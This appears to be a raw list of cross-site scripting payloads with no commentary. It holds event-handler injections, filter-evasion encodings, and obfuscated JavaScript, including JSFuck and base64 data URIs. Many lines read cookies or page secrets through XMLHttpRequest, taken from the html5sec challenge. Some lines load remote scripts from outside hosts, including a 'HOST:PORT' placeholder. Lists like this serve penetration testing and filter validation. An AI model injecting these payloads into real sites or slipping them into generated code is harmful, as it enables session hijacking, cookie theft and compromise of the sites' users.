<img src='1' onerror/=alert(0) />
<script>window['alert'](0)</script>
<script>parent['alert'](1)</script>
<script>self['alert'](2)</script>
<script>top['alert'](3)</script>
"><svg onload=alert(1)//
"onmouseover=alert(1)//
"autofocus/onfocus=alert(1)//
'-alert(1)-'
'-alert(1)//
\'-alert(1)//
</script><svg onload=alert(1)>
<x contenteditable onblur=alert(1)>lose focus!
<x onclick=alert(1)>click this!
<x oncopy=alert(1)>copy this!
<x oncontextmenu=alert(1)>right click this!
<x oncut=alert(1)>copy this!
<x ondblclick=alert(1)>double click this!
<x ondrag=alert(1)>drag this!
<x contenteditable onfocus=alert(1)>focus this!
<x contenteditable oninput=alert(1)>input here!
<x contenteditable onkeydown=alert(1)>press any key!
<x contenteditable onkeypress=alert(1)>press any key!
<x contenteditable onkeyup=alert(1)>press any key!
<x onmousedown=alert(1)>click this!
<x onmousemove=alert(1)>hover this!
<x onmouseout=alert(1)>hover this!
<x onmouseover=alert(1)>hover this!
<x onmouseup=alert(1)>click this!
<x contenteditable onpaste=alert(1)>paste here!
<script>alert(1)//
<script>alert(1)<!–
<script src=//brutelogic.com.br/1.js>
<script src=//3334957647/1>
%3Cx onxxx=alert(1)
<%78 onxxx=1
<x %6Fnxxx=1
<x o%6Exxx=1
<x on%78xx=1
<x onxxx%3D1
<X onxxx=1
<x OnXxx=1
<X OnXxx=1
<x onxxx=1 onxxx=1
<x/onxxx=1
<x%09onxxx=1
<x%0Aonxxx=1
<x%0Conxxx=1
<x%0Donxxx=1
<x%2Fonxxx=1
<x 1='1'onxxx=1
<x 1="1"onxxx=1
<x </onxxx=1
<x 1=">" onxxx=1
<http://onxxx%3D1/
<x onxxx=alert(1) 1='
<svg onload=setInterval(function(){with(document)body.appendChild(createElement('script')).src='//HOST:PORT'},0)>
'onload=alert(1)><svg/1='
'>alert(1)</script><script/1='
*/alert(1)</script><script>/*
*/alert(1)">'onload="/*<svg/1='
`-alert(1)">'onload="`<svg/1='
*/</script>'>alert(1)/*<script/1='
<script>alert(1)</script>
<script src=javascript:alert(1)>
<iframe src=javascript:alert(1)>
<embed src=javascript:alert(1)>
<a href=javascript:alert(1)>click
<math><brute href=javascript:alert(1)>click
<form action=javascript:alert(1)><input type=submit>
<isindex action=javascript:alert(1) type=submit value=click>
<form><button formaction=javascript:alert(1)>click
<form><input formaction=javascript:alert(1) type=submit value=click>
<form><input formaction=javascript:alert(1) type=image value=click>
<form><input formaction=javascript:alert(1) type=image src=SOURCE>
<isindex formaction=javascript:alert(1) type=submit value=click>
<object data=javascript:alert(1)>
<iframe srcdoc=<svg/o&#x6Eload&equals;alert&lpar;1)&gt;>
<svg><script xlink:href=data:,alert(1) />
<math><brute xlink:href=javascript:alert(1)>click
<svg><a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href=?><circle r=400 /><animate attributeName=xlink:href begin=0 from=javascript:alert(1) to=&>
<html ontouchstart=alert(1)>
<html ontouchend=alert(1)>
<html ontouchmove=alert(1)>
<html ontouchcancel=alert(1)>
<body onorientationchange=alert(1)>
"><img src=1 onerror=alert(1)>.gif
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;
<script src="data:&comma;alert(1)//
"><script src=data:&comma;alert(1)//
<script src="//brutelogic.com.br&sol;1.js&num;
"><script src=//brutelogic.com.br&sol;1.js&num;
<link rel=import href="data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt;
"><link rel=import href=data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt;
<base href=//0>
<script/src="data:&comma;eval(atob(location.hash.slice(1)))//#alert(1)
<body onload=alert(1)>
<body onpageshow=alert(1)>
<body onfocus=alert(1)>
<body onhashchange=alert(1)><a href=#x>click this!#x
<body style=overflow:auto;height:1000px onscroll=alert(1) id=x>#x
<body onscroll=alert(1)><br><br><br><br>
<body onresize=alert(1)>press F12!
<body onhelp=alert(1)>press F1! (MSIE)
<marquee onstart=alert(1)>
<marquee loop=1 width=0 onfinish=alert(1)>
<audio src onloadstart=alert(1)>
<video onloadstart=alert(1)><source>
<input autofocus onblur=alert(1)>
<keygen autofocus onfocus=alert(1)>
<form onsubmit=alert(1)><input type=submit>
<select onchange=alert(1)><option>1<option>2
<menu id=x contextmenu=x onshow=alert(1)>right click me!
<script>\u0061\u006C\u0065\u0072\u0074(1)</script>
<img src="1" onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;" />
<iframe src="javascript:%61%6c%65%72%74%28%31%29"></iframe>
<script>$=~[];$={___:++$,$$$$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$$:({}+"")[$],$$_$:($[$]+"")[$],_$$:++$,$$$_:(!""+"")[$],$__:++$,$_$:++$,$$__:({}+"")[$],$$_:++$,$$$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+"")[$.$_$]+($._$=$.$_[$.__$])+($.$$=($.$+"")[$.__$])+((!$)+"")[$._$$]+($.__=$.$_[$.$$_])+($.$=(!""+"")[$.__$])+($._=(!""+"")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!""+"")[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+"\""+$.$_$_+(![]+"")[$._$_]+$.$$$_+"\\"+$.__$+$.$$_+$._$_+$.__+"("+$.___+")"+"\"")())();</script>
<script>(+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]]]+[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]])()</script>
<img src=1 alt=al lang=ert onerror=top[alt+lang](0)>
<script>$=1,alert($)</script>
<script ~~~>confirm(1)</script ~~~>
<script>$=1,\u0061lert($)</script>
<</script/script><script>eval('\\u'+'0061'+'lert(1)')//</script>
<</script/script><script ~~~>\u0061lert(1)</script ~~~>
</style></scRipt><scRipt>alert(1)</scRipt>
<img/id="alert&lpar;&#x27;XSS&#x27;&#x29;\"/alt=\"/\"src=\"/\"onerror=eval(id&#x29;>
<img src=x:prompt(eval(alt)) onerror=eval(src) alt=String.fromCharCode(88,83,83)>
<svg><x><script>alert&#40;&#39;1&#39;&#41</x>
<iframe src=""/srcdoc='&lt;svg onload&equals;alert&lpar;1&rpar;&gt;'>
'%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Eshadowlabs(0x000045)%3C/script%3E
<<scr\0ipt/src=http://xss.com/xss.js></script
%27%22--%3E%3C%2Fstyle%3E%3C%2Fscript%3E%3Cscript%3ERWAR%280x00010E%29%3C%2Fscript%3E
' onmouseover=alert(/Black.Spook/)
"><iframe%20src="http://google.com"%%203E
'<script>window.onload=function(){document.forms[0].message.value='1';}</script>
x”</title><img src%3dx onerror%3dalert(1)>
<script> document.getElementById(%22safe123%22).setCapture(); document.getElementById(%22safe123%22).click(); </script>
<script>Object.defineProperties(window, {Safe: {value: {get: function() {return document.cookie}}}});alert(Safe.get())</script>
<script>var x = document.createElement('iframe');document.body.appendChild(x);var xhr = x.contentWindow.XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();</script>
<script>(function() {var event = document.createEvent(%22MouseEvents%22);event.initMouseEvent(%22click%22, true, true, window, 0, 0, 0, 0, 0, false, false, false, false, 0, null);var fakeData = [event, {isTrusted: true}, event];arguments.__defineGetter__('0', function() { return fakeData.pop(); });alert(Safe.get.apply(null, arguments));})();</script>
<script>var script = document.getElementsByTagName('script')[0]; var clone = script.childNodes[0].cloneNode(true); var ta = document.createElement('textarea'); ta.appendChild(clone); alert(ta.value.match(/cookie = '(.*?)'/)[1])</script>
<script>xhr=new ActiveXObject(%22Msxml2.XMLHTTP%22);xhr.open(%22GET%22,%22/xssme2%22,true);xhr.onreadystatechange=function(){if(xhr.readyState==4%26%26xhr.status==200){alert(xhr.responseText.match(/'([^']%2b)/)[1])}};xhr.send();</script>
<script>alert(document.documentElement.innerHTML.match(/'([^']%2b)/)[1])</script>
<script>alert(document.getElementsByTagName('html')[0].innerHTML.match(/'([^']%2b)/)[1])</script>
<%73%63%72%69%70%74> %64 = %64%6f%63%75%6d%65%6e%74%2e%63%72%65%61%74%65%45%6c%65%6d%65%6e%74(%22%64%69%76%22); %64%2e%61%70%70%65%6e%64%43%68%69%6c%64(%64%6f%63%75%6d%65%6e%74%2e%68%65%61%64%2e%63%6c%6f%6e%65%4e%6f%64%65(%74%72%75%65)); %61%6c%65%72%74(%64%2e%69%6e%6e%65%72%48%54%4d%4c%2e%6d%61%74%63%68(%22%63%6f%6f%6b%69%65 = '(%2e%2a%3f)'%22)[%31]); </%73%63%72%69%70%74>
<script> var xdr = new ActiveXObject(%22Microsoft.XMLHTTP%22);  xdr.open(%22get%22, %22/xssme2%3Fa=1%22, true); xdr.onreadystatechange = function() { try{   var c;   if (c=xdr.responseText.match(/document.cookie = '(.*%3F)'/) )    alert(c[1]); }catch(e){} };  xdr.send(); </script>
<iframe id=%22ifra%22 src=%22/%22></iframe> <script>ifr = document.getElementById('ifra'); ifr.contentDocument.write(%22<scr%22 %2b %22ipt>top.foo = Object.defineProperty</scr%22 %2b %22ipt>%22); foo(window, 'Safe', {value:{}}); foo(Safe, 'get', {value:function() {    return document.cookie }}); alert(Safe.get());</script>
<script>alert(document.head.innerHTML.substr(146,20));</script>
<script>alert(document.head.childNodes[3].text)</script>
<script>var request = new XMLHttpRequest();request.open('GET', 'http://html5sec.org/xssme2', false);request.send(null);if (request.status == 200){alert(request.responseText.substr(150,41));}</script>
<script>Object.defineProperty(window, 'Safe', {value:{}});Object.defineProperty(Safe, 'get', {value:function() {return document.cookie}});alert(Safe.get())</script>
<script>x=document.createElement(%22iframe%22);x.src=%22http://xssme.html5sec.org/404%22;x.onload=function(){window.frames[0].document.write(%22<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\/script>%22)};document.body.appendChild(x);</script>
<script>x=document.createElement(%22iframe%22);x.src=%22http://xssme.html5sec.org/404%22;x.onload=function(){window.frames[0].document.write(%22<script>Object.defineProperty(parent,'Safe',{value:{}});Object.defineProperty(parent.Safe,'get',{value:function(){return top.document.cookie}});alert(parent.Safe.get())<\/script>%22)};document.body.appendChild(x);</script>
<script> var+xmlHttp+=+null; try+{ xmlHttp+=+new+XMLHttpRequest(); }+catch(e)+{} if+(xmlHttp)+{ xmlHttp.open('GET',+'/xssme2',+true); xmlHttp.onreadystatechange+=+function+()+{ if+(xmlHttp.readyState+==+4)+{ xmlHttp.responseText.match(/document.cookie%5Cs%2B=%5Cs%2B'(.*)'/gi); alert(RegExp.%241); } } xmlHttp.send(null); }; </script>
<script> document.getElementById(%22safe123%22).click=function()+{alert(Safe.get());} document.getElementById(%22safe123%22).click({'type':'click','isTrusted':true}); </script>
<script> var+MouseEvent=function+MouseEvent(){}; MouseEvent=MouseEvent var+test=new+MouseEvent(); test.isTrusted=true; test.type='click';  document.getElementById(%22safe123%22).click=function()+{alert(Safe.get());} document.getElementById(%22safe123%22).click(test); </script>
<script>  (function (o) {   function exploit(x) {    if (x !== null)     alert('User cookie is ' %2B x);    else     console.log('fail');   }      o.onclick = function (e) {    e.__defineGetter__('isTrusted', function () { return true; });    exploit(Safe.get());   };      var e = document.createEvent('MouseEvent');   e.initEvent('click', true, true);   o.dispatchEvent(e);  })(document.getElementById('safe123')); </script>
<iframe src=/ onload=eval(unescape(this.name.replace(/\/g,null))) name=fff%253Dnew%2520this.contentWindow.window.XMLHttpRequest%2528%2529%253Bfff.open%2528%2522GET%2522%252C%2522xssme2%2522%2529%253Bfff.onreadystatechange%253Dfunction%2528%2529%257Bif%2520%2528fff.readyState%253D%253D4%2520%2526%2526%2520fff.status%253D%253D200%2529%257Balert%2528fff.responseText%2529%253B%257D%257D%253Bfff.send%2528%2529%253B></iframe>
<script>     function b() { return Safe.get(); } alert(b({type:String.fromCharCode(99,108,105,99,107),isTrusted:true})); </script> 
<img src=http://www.google.fr/images/srpr/logo3w.png onload=alert(this.ownerDocument.cookie) width=0 height= 0 /> #
<script>  function foo(elem, doc, text) {   elem.onclick = function (e) {    e.__defineGetter__(text[0], function () { return true })    alert(Safe.get());   };      var event = doc.createEvent(text[1]);   event.initEvent(text[2], true, true);   elem.dispatchEvent(event);  } </script> <img src=http://www.google.fr/images/srpr/logo3w.png onload=foo(this,this.ownerDocument,this.name.split(/,/)) name=isTrusted,MouseEvent,click width=0 height=0 /> # 
<SCRIPT+FOR=document+EVENT=onreadystatechange>MouseEvent=function+MouseEvent(){};test=new+MouseEvent();test.isTrusted=true;test.type=%22click%22;getElementById(%22safe123%22).click=function()+{alert(Safe.get());};getElementById(%22safe123%22).click(test);</SCRIPT>#
<script> var+xmlHttp+=+null; try+{ xmlHttp+=+new+XMLHttpRequest(); }+catch(e)+{} if+(xmlHttp)+{ xmlHttp.open('GET',+'/xssme2',+true); xmlHttp.onreadystatechange+=+function+()+{ if+(xmlHttp.readyState+==+4)+{ xmlHttp.responseText.match(/document.cookie%5Cs%2B=%5Cs%2B'(.*)'/gi); alert(RegExp.%241); } } xmlHttp.send(null); }; </script>#
<video+onerror='javascript:MouseEvent=function+MouseEvent(){};test=new+MouseEvent();test.isTrusted=true;test.type=%22click%22;document.getElementById(%22safe123%22).click=function()+{alert(Safe.get());};document.getElementById(%22safe123%22).click(test);'><source>%23
<script for=document event=onreadystatechange>getElementById('safe123').click()</script>
<script> var+x+=+showModelessDialog+(this); alert(x.document.cookie); </script>
<script> location.href = 'data:text/html;base64,PHNjcmlwdD54PW5ldyBYTUxIdHRwUmVxdWVzdCgpO3gub3BlbigiR0VUIiwiaHR0cDovL3hzc21lLmh0bWw1c2VjLm9yZy94c3NtZTIvIix0cnVlKTt4Lm9ubG9hZD1mdW5jdGlvbigpIHsgYWxlcnQoeC5yZXNwb25zZVRleHQubWF0Y2goL2RvY3VtZW50LmNvb2tpZSA9ICcoLio/KScvKVsxXSl9O3guc2VuZChudWxsKTs8L3NjcmlwdD4='; </script>
<iframe src=%22404%22 onload=%22frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\/script>%26quot;)%22></iframe>
<iframe src=%22404%22 onload=%22content.frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\/script>%26quot;)%22></iframe>
<iframe src=%22404%22 onload=%22self.frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\/script>%26quot;)%22></iframe>
<iframe src=%22404%22 onload=%22top.frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\/script>%26quot;)%22></iframe>
<script>var x = safe123.onclick;safe123.onclick = function(event) {var f = false;var o = { isTrusted: true };var a = [event, o, event];var get;event.__defineGetter__('type', function() {get = arguments.callee.caller.arguments.callee;return 'click';});var _alert = alert;alert = function() { alert = _alert };x.apply(null, a);(function() {arguments.__defineGetter__('0', function() { return a.pop(); });alert(get());})();};safe123.click();</script>#
<iframe onload=%22write('<script>'%2Blocation.hash.substr(1)%2B'</script>')%22></iframe>#var xhr = new XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();
<textarea id=ta></textarea><script>ta.appendChild(safe123.parentNode.previousSibling.previousSibling.childNodes[3].firstChild.cloneNode(true));alert(ta.value.match(/cookie = '(.*?)'/)[1])</script>
<textarea id=ta onfocus=console.dir(event.currentTarget.ownerDocument.location.href=%26quot;javascript:\%26quot;%26lt;script%26gt;var%2520xhr%2520%253D%2520new%2520XMLHttpRequest()%253Bxhr.open('GET'%252C%2520'http%253A%252F%252Fhtml5sec.org%252Fxssme2'%252C%2520true)%253Bxhr.onload%2520%253D%2520function()%2520%257B%2520alert(xhr.responseText.match(%252Fcookie%2520%253D%2520'(.*%253F)'%252F)%255B1%255D)%2520%257D%253Bxhr.send()%253B%26lt;\/script%26gt;\%26quot;%26quot;) autofocus></textarea>
<iframe onload=%22write('<script>'%2Blocation.hash.substr(1)%2B'</script>')%22></iframe>#var xhr = new XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();
<textarea id=ta></textarea><script>ta.appendChild(safe123.parentNode.previousSibling.previousSibling.childNodes[3].firstChild.cloneNode(true));alert(ta.value.match(/cookie = '(.*?)'/)[1])</script>
<script>function x(window) { eval(location.hash.substr(1)) }</script><iframe id=iframe src=%22javascript:parent.x(window)%22><iframe>#var xhr = new window.XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();
<textarea id=ta onfocus=%22write('<script>alert(1)</script>')%22 autofocus></textarea>
<object data=%22data:text/html;base64,PHNjcmlwdD4gdmFyIHhociA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOyB4aHIub3BlbignR0VUJywgJ2h0dHA6Ly94c3NtZS5odG1sNXNlYy5vcmcveHNzbWUyJywgdHJ1ZSk7IHhoci5vbmxvYWQgPSBmdW5jdGlvbigpIHsgYWxlcnQoeGhyLnJlc3BvbnNlVGV4dC5tYXRjaCgvY29va2llID0gJyguKj8pJy8pWzFdKSB9OyB4aHIuc2VuZCgpOyA8L3NjcmlwdD4=%22>
<script>function x(window) { eval(location.hash.substr(1)) }; open(%22javascript:opener.x(window)%22)</script>#var xhr = new window.XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();
%3Cscript%3Exhr=new%20ActiveXObject%28%22Msxml2.XMLHTTP%22%29;xhr.open%28%22GET%22,%22/xssme2%22,true%29;xhr.onreadystatechange=function%28%29{if%28xhr.readyState==4%26%26xhr.status==200%29{alert%28xhr.responseText.match%28/%27%28[^%27]%2b%29/%29[1]%29}};xhr.send%28%29;%3C/script%3E
<iframe src=`http://xssme.html5sec.org/?xss=<iframe onload=%22xhr=new XMLHttpRequest();xhr.open('GET','http://html5sec.org/xssme2',true);xhr.onreadystatechange=function(){if(xhr.readyState==4%26%26xhr.status==200){alert(xhr.responseText.match(/'([^']%2b)/)[1])}};xhr.send();%22>`>
<a target="x" href="xssme?xss=%3Cscript%3EaddEventListener%28%22DOMFrameContentLoaded%22,%20function%28e%29%20{e.stopPropagation%28%29;},%20true%29;%3C/script%3E%3Ciframe%20src=%22data:text/html,%253cscript%253eObject.defineProperty%28top,%20%27MyEvent%27,%20{value:%20Object,%20configurable:%20true}%29;function%20y%28%29%20{alert%28top.Safe.get%28%29%29;};event%20=%20new%20Object%28%29;event.type%20=%20%27click%27;event.isTrusted%20=%20true;y%28event%29;%253c/script%253e%22%3E%3C/iframe%3E
<a target="x" href="xssme?xss=<script>var cl=Components;var fcc=String.fromCharCode;doc=cl.lookupMethod(top, fcc(100,111,99,117,109,101,110,116) )( );cl.lookupMethod(doc,fcc(119,114,105,116,101))(doc.location.hash)</script>#<iframe src=data:text/html;base64,PHNjcmlwdD5ldmFsKGF0b2IobmFtZSkpPC9zY3JpcHQ%2b name=ZG9jPUNvbXBvbmVudHMubG9va3VwTWV0aG9kKHRvcC50b3AsJ2RvY3VtZW50JykoKTt2YXIgZmlyZU9uVGhpcyA9ICBkb2MuZ2V0RWxlbWVudEJ5SWQoJ3NhZmUxMjMnKTt2YXIgZXZPYmogPSBkb2N1bWVudC5jcmVhdGVFdmVudCgnTW91c2VFdmVudHMnKTtldk9iai5pbml0TW91c2VFdmVudCggJ2NsaWNrJywgdHJ1ZSwgdHJ1ZSwgd2luZG93LCAxLCAxMiwgMzQ1LCA3LCAyMjAsIGZhbHNlLCBmYWxzZSwgdHJ1ZSwgZmFsc2UsIDAsIG51bGwgKTtldk9iai5fX2RlZmluZUdldHRlcl9fKCdpc1RydXN0ZWQnLGZ1bmN0aW9uKCl7cmV0dXJuIHRydWV9KTtmdW5jdGlvbiB4eChjKXtyZXR1cm4gdG9wLlNhZmUuZ2V0KCl9O2FsZXJ0KHh4KGV2T2JqKSk></iframe>
<a target="x" href="xssme?xss=<script>find('cookie'); var doc = getSelection().getRangeAt(0).startContainer.ownerDocument; console.log(doc); var xpe = new XPathEvaluator(); var nsResolver = xpe.createNSResolver(doc); var result = xpe.evaluate('//script/text()', doc, nsResolver, 0, null); alert(result.iterateNext().data.match(/cookie = '(.*?)'/)[1])</script>
<a target="x" href="xssme?xss=<script>function x(window) { eval(location.hash.substr(1)) }</script><iframe src=%22javascript:parent.x(window);%22></iframe>#var xhr = new window.XMLHttpRequest();xhr.open('GET', '.', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();
Garethy Salty Method!<script>alert(Components.lookupMethod(Components.lookupMethod(Components.lookupMethod(Components.lookupMethod(this,'window')(),'document')(), 'getElementsByTagName')('html')[0],'innerHTML')().match(/d.*'/));</script>
<a href="javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;"><button>
<div onmouseover='alert&lpar;1&rpar;'>DIV</div>
<iframe style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)">
<a href="jAvAsCrIpT&colon;alert&lpar;1&rpar;">X</a>
<embed src="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf"> ?
<object data="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">?
<var onmouseover="prompt(1)">On Mouse Over</var>?
<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>
<img src="/" =_=" title="onerror='prompt(1)'">
<%<!--'%><script>alert(1);</script -->
<script src="data:text/javascript,alert(1)"></script>
<iframe/src \/\/onload = prompt(1)
<iframe/onreadystatechange=alert(1)
<svg/onload=alert(1)
<input value=<><iframe/src=javascript:confirm(1)
<input type="text" value=``<div/onmouseover='alert(1)'>X</div>
http://www.<script>alert(1)</script .com
<iframe  src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe> ?
<svg><script ?>alert(1)
